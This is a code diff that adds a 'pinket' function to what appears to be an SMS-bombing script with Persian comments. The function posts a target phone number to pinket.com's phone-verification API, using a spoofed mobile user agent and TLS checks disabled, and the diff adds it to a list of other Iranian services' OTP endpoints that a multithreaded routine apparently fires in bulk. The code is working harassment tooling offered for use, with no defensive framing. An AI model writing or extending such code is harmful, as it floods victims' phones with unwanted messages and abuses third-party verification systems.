@@ -64,6 +64,45 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+def pinket(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+            "Origin": "https://pinket.com",
+            "Referer": "https://pinket.com/"
+        }
+        
+        payload = {
+            "phoneNumber": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://pinket.com/api/cu/v2/phone-verification",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[pinket] Status: {response.status_code}{a}')
+        print(f'{y}[pinket] Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(pinket) OTP sent successfully! ✅{a}')
+            return True
+        else:
+            print(f'{r}[-] pinket error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] pinket exception: {e}{a}')
+        return False
+
 
 def harikashop(phone):
     try:
@@ -325,7 +364,7 @@ def drto(phone):
 
 
 
-services = [alibaba, snapp, tebinja, drto, masterkala, harikashop]
+services = [alibaba, snapp, tebinja, drto, masterkala, harikashop, pinket]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
